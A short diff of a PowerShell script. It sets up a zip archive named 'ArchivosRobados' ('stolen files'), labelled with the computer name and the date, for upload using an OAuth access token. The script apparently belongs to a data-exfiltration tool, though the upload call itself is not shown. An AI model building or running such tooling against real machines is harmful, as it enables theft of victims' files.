@@ -170,7 +170,8 @@ $params = @{
 $accessToken = (Invoke-RestMethod @params).access_token
 
 # Change this to the file you want to upload
-$FileEncrypted = c:\temp\ArchivosRobados-"$ArchivosRobados".zip
+$ArchivosRobados = "$env:computername-$(get-date -f yyyy-MM-dd)"
+$FileEncrypted = 'c:\temp\ArchivosRobados-"$ArchivosRobados".zip'
 
 Write-Host "Ruta de archivos Robados: $FileEncrypted" -ForegroundColor Red
 
